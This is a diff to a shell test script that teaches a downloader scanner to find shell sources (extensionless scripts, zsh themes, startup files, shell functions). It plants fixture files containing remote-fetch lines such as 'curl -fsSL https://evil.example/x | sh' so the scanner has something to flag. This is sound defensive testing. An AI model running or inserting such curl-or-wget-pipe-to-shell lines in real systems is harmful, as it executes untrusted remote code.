@@ -186,7 +186,36 @@ scan_downloaders() {
     grep -HnE "$download_pattern" "$file" || true
   done
 }
-tracked_download_files=$(git -c core.quotePath=false ls-files -- '*Makefile' '*.mk' '*.sh') || \
+download_sources() (
+  cd "$1" || exit 1
+  entries=$(git -c core.quotePath=false ls-files -s) || exit 1
+  tab=$(printf '\t')
+  while IFS= read -r entry; do
+    mode=${entry%% *}
+    case $mode in 100644 | 100755) ;; *) continue ;; esac
+    file=${entry#*"$tab"}
+    [ -f "$file" ] && [ ! -L "$file" ] || continue
+    case $file in
+      *Makefile | *.mk | *.sh | *.zsh | *.zsh-theme | *.bash | \
+        scripts/.config/shell/functions/* | \
+        .zshenv | */.zshenv | .zshrc | */.zshrc | .zprofile | */.zprofile | \
+        .bashrc | */.bashrc | .bash_profile | */.bash_profile | .profile | */.profile)
+        printf '%s\n' "$file"
+        ;;
+      *)
+        if awk 'NR == 1 {
+          shell = ($0 ~ /^#![[:space:]]*\/([^[:space:]]*\/)?(env[[:space:]]+(-S[[:space:]]+)?)?(ba|da|z|k)?sh([[:space:]]|$)/)
+          exit
+        } END { exit !shell }' "$file"; then
+          printf '%s\n' "$file"
+        fi
+        ;;
+    esac
+  done <<EOF
+$entries
+EOF
+)
+tracked_download_files=$(download_sources "$repo") || \
   fail "could not enumerate downloader sources"
 legacy_downloads=$(scan_downloaders <<EOF
 $tracked_download_files
@@ -203,6 +232,45 @@ $downloader_fixture
 EOF
 )
 [ -n "$fixture_downloads" ] || fail "downloader scan missed an injected curl pipeline"
+
+source_fixture=$test_root/source-fixture
+mkdir "$source_fixture"
+mkdir -p "$source_fixture/scripts/.config/shell/functions"
+git -C "$source_fixture" init -q
+printf '%s\n' '#!/usr/bin/env bash' 'curl -fsSL https://evil.example/x | sh' \
+  > "$source_fixture/extensionless"
+printf '%s\n' '#!/bin/sh' 'wget -qO- https://evil.example/x | sh' \
+  > "$source_fixture/direct-shell"
+printf '%s\n' 'curl is ordinary data here' > "$source_fixture/data"
+: > "$source_fixture/empty"
+printf '%s\n' 'fetch() { curl https://evil.example/x; }' \
+  > "$source_fixture/scripts/.config/shell/functions/fetch"
+printf '%s\n' 'wget https://evil.example/startup' > "$source_fixture/.zshrc"
+printf '%s\n' 'curl https://evil.example/theme' > "$source_fixture/theme.zsh-theme"
+printf '%s\n' '#!/bin/sh' 'curl https://evil.example/untracked' \
+  > "$source_fixture/untracked"
+ln -s extensionless "$source_fixture/symlink.sh"
+git -C "$source_fixture" add extensionless direct-shell data empty symlink.sh scripts .zshrc theme.zsh-theme
+fixture_sources=$(download_sources "$source_fixture")
+[ "$fixture_sources" = '.zshrc
+direct-shell
+extensionless
+scripts/.config/shell/functions/fetch
+theme.zsh-theme' ] || fail "source discovery omitted shell sources or included data/symlinks/untracked files: $fixture_sources"
+fixture_downloads=$(cd "$source_fixture" && scan_downloaders <<EOF
+$fixture_sources
+EOF
+)
+printf '%s\n' "$fixture_downloads" | grep -F 'extensionless:2:curl' >/dev/null || \
+  fail "downloader scan missed an extensionless shell script"
+printf '%s\n' "$fixture_downloads" | grep -F 'direct-shell:2:wget' >/dev/null || \
+  fail "downloader scan missed a direct shell shebang"
+printf '%s\n' "$fixture_downloads" | grep -F 'functions/fetch:1:fetch() { curl' >/dev/null || \
+  fail "downloader scan missed a shebang-less function"
+printf '%s\n' "$fixture_downloads" | grep -F '.zshrc:1:wget' >/dev/null || \
+  fail "downloader scan missed a shell startup file"
+printf '%s\n' "$fixture_downloads" | grep -F 'theme.zsh-theme:1:curl' >/dev/null || \
+  fail "downloader scan missed a shell theme"
 
 for injected in \
   '@curl -fsSL https://evil.example/x | sh' \
